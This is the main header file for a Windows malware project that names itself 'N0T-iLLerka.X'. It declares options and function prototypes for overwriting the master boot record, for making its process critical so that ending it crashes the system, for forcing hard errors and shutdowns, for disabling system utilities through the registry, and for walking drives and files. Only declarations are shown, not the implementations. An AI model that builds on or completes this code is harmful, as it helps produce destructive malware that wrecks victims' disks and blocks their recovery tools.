//// N0T-iLLerka.X main Header include File ////
#pragma once

// Warning Message: //
/* #define DISABLE_WARNING */
	// If defined: Shows the user a warning message that he is about to execute Malware.
	//			   ( IT IS NOT RECOMMENDED TO DISABLE THIS FEATURE ! )

// Kill MasterBootRecord: //
/* #define KILL_MBR */
	// If defined: Kills the MBR (MasterBootRecord) by overwriting it (with Zeros)
	//			   (Optional) ((I might write my own MBR displaying a Message))

//// Debug Mode: ////
#define DEBUG
	// If defined: Allows you to disables security features, used by the Malware to prevent the user from tampering with it.
	//			   Also allows you to enable certain debugging features.

//// Debug Suboptions: ////
#ifdef DEBUG
	// Debug MessageBoxes: //
	#define DEBUG_MSG
		// If defined: Shows the user Error/Warning/Information/(Question) MessageBoxes used for debbuging.

	// NT Process Persistency: //
	#define DISABLE_NT_FUNCTIONS
		// If defined: Disables and prevents the Malware from utilizing the NT Functions used for Process Persistency.

	// Mutex/Semaphore utilization: //
	/* #define DISABLE_SYNCHRONIZATION */
		// If defined: Disables the usage of a Global Mutex/Semaphore Object
		//			   (It is not recommended to disable this feature, but it might be sometimes necessary for debugging purposes)
#endif

// Debug MessageBox Template (for C&P-ing) //
/*
	#ifdef DEBUG_MSG
		fnErrorHandlerW(L"", NULL, L"", MB_OK | MB_ICON);
	#endif // DEBUG_MSG
*/

// Compiler/Linker //
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Dependencies //
#include <Windows.h>
#include <bcrypt.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <string>
#include <vector>

#ifdef DEBUG_MSG
#include <strsafe.h>
#endif // DEBUG_MSG

// Libraries //
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

#ifndef DISABLE_NT_FUNCTIONS
#pragma comment(lib, "ntdll.lib")
#endif // !DISABLE_NT_FUNCTIONS

// FileSystem Macros //
#define nDRIVES 0x1a * 0x4
#define nMBR_SIZE 0x200

// RegEdit Macros //
#define szREGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
#define szREGISTRY_SUBKEY L"N0TiLLerka"
#define nREGISTRY_VALUE 0xBADC0DE
#define HKLM 0x1
#define HKCU 0x2

// Synchronization Macros //
#define szHOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv:/host.Proc(running)"
#define szHOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv:/host.Proc(running)"
#define nMAX_SEMAPHORE 2

// Utilitie Macros //
#define szMALWR_NAME L"N0T-iLLerka.X"
#define szFORMAT L"%s failed with Errorcode:\n%d : %s\n\nDetails:\n"
#define nFORMAT_LEN lstrlen(szFORMAT)
#define nMAX_HEAP_SIZE 0xfa0

#define nMIN_RS_LEN 0x8
#define nMAX_RS_LEN 0x10
#define nMAX_BUFFER_SIZE 0x2000000

// Wrapper Macros //
#define nRNG_RAN(nMin, nMax) ((nMin) + (fnCryptGenRandomNumber() % (((nMax) - (nMin)) + 1)))

#ifndef DISABLE_NT_FUNCTIONS
// NT Macros //
#define OPTION_SHUTDOWN_SYSTEM 0x6
#define SE_SHUTDOWN_PRIVILEGE 0x13
#define SE_DEBUG_PRIVILEGE 0x14
#endif // !DISABLE_NT_FUNCTIONS

// Typedefinitions //
#ifndef DISABLE_NT_FUNCTIONS
typedef struct {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
#endif // !DISABLE_NT_FUNCTIONS

// Arrays/Sizes //
extern const WCHAR szCharSet[];
extern const size_t cnCharSet;

// FileSystem Functions //
BOOL fnCopyFileW(
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn,
	_In_ WCHAR szMfn[]
);
BOOL fnDriveEnumeratorW(
	_Inout_ std::vector<std::wstring>& vszDrive
);
BOOL fnDirectoryIteratorW(
	_In_ std::wstring szDir,
	_In_ std::wstring szMask,
	_Inout_ std::vector<std::wstring>& vszDir,
	_Inout_ std::vector<std::wstring>& vszFile
);

#ifdef KILL_MBR
BOOL fnOverwriteMBR(VOID);
#endif // KILL_MBR

// RegEdit Functions //
BOOL fnCreateRegistryKeyW(
	_In_ BOOL hKeyOpt,
	_In_ LPCWSTR lpSubKey,
	_In_ LPCWSTR lpValueName,
	_In_ DWORD dwType,
	_In_ DWORD dwValue
);
BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey,
	_In_ LPCWSTR lpValueName,
	_In_ DWORD dwEType,
	_In_ BYTE bEValue
);
BOOL fnDisableUtilities(VOID);

// Synchronization Functions //
#ifndef DISABLE_SYNCHRONIZATION
BOOL fnCheckMutexW(
	_In_ LPCWSTR lpName
);
HANDLE fnCheckSemaphoreW(
	_In_ LPCWSTR lpName
);
#endif // !DISABLE_SYNCHRONIZATION

// Utilitie Functions //
INT fnCryptGenRandomNumber(VOID);
std::wstring fnCryptGenRandomStringW(
	_In_ INT nLen
);
VOID fnCryptGenRandomBufferW(
	_Out_ PWCHAR pszRd,
	_In_ ULONG ulFs
);
BOOL fnIsUserAdmin(VOID);
VOID fnErrorHandlerW(
	_In_opt_ LPCWSTR lpText,
	_In_opt_ LPCWSTR lpCaption,
	_In_opt_ LPCWSTR lpFunction,
	_In_ UINT uType,
	_In_opt_ ...
);

#ifndef DISABLE_NT_FUNCTIONS
// NT/RTL Function Prototypes //
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
	_In_ ULONG,
	_In_ BOOLEAN,
	_In_ BOOLEAN,
	_Out_ PBOOLEAN
);
EXTERN_C NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
	_In_ BOOLEAN,
	_Out_opt_ PBOOLEAN,
	_In_ BOOLEAN
);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(
	_In_ NTSTATUS,
	_In_ ULONG,
	_In_opt_ PUNICODE_STRING,
	_In_opt_ PVOID*,
	_In_ UINT,
	_Out_ PUINT
);

// NT Utilitie Functions //
BOOL fnNTSetProcessIsCritical(
	_In_ BOOLEAN blIsCritical
);
BOOL fnNTRaiseHardError(VOID);
#endif // !DISABLE_NT_FUNCTIONS